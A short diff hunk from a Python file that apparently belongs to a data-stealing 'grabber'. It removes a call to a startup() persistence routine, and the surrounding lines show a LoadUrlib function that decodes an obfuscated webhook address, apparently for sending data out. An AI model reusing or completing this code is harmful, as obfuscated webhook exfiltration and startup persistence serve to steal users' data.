@@ -339,9 +339,6 @@ def startup():
     else:
         if __file__.replace('\\', '/') != path.replace('\\', '/'):
             pass
-
-startup()
-
 def LoadUrlib(hook, data='', files='', headers=''):
     
     hook = deobf(webhook[0],webhook[1]).decode()
